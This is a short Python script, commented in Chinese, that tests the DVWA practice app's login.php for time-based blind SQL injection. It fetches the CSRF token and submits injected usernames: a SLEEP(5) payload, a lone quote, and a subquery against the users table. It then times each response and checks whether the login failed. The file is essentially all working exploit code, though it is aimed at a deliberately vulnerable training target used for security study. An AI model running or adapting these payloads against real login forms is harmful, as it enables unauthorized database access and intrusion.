#!/usr/bin/env python3
"""DVWA login.php SQLi 时间盲注探测: 测 SLEEP 是否生效, 判断 SQLi 可行性与 DB 状态.
用法: python3 dvwa_login_time.py <base_url>
"""
import re, sys, time, urllib.request, http.cookiejar

base = sys.argv[1]

def attempt(user, pwd, label):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    html = op.open(base + "/login.php", timeout=15).read().decode(errors="replace")
    m = re.search(r"name='user_token'\s+value='([0-9a-f]+)'", html)
    data = urllib.parse.urlencode({"username": user, "password": pwd,
                                   "Login": "Login", "user_token": m.group(1)}).encode()
    t0 = time.time()
    try:
        body = op.open(base + "/login.php", data=data, timeout=15).read().decode(errors="replace")
        dt = time.time() - t0
        failed = "Login failed" in body
        print(f"{label}: {dt:.2f}s len={len(body)} login_failed={failed}")
    except Exception as e:
        print(f"{label}: EXC {e} after {time.time()-t0:.2f}s")

attempt("admin' AND SLEEP(5)-- ", "x", "sleep-inject")
attempt("admin", "x", "normal-1")
attempt("'", "x", "quote-only")
attempt("admin' AND (SELECT 1 FROM users LIMIT 1)=1-- ", "x", "subquery")
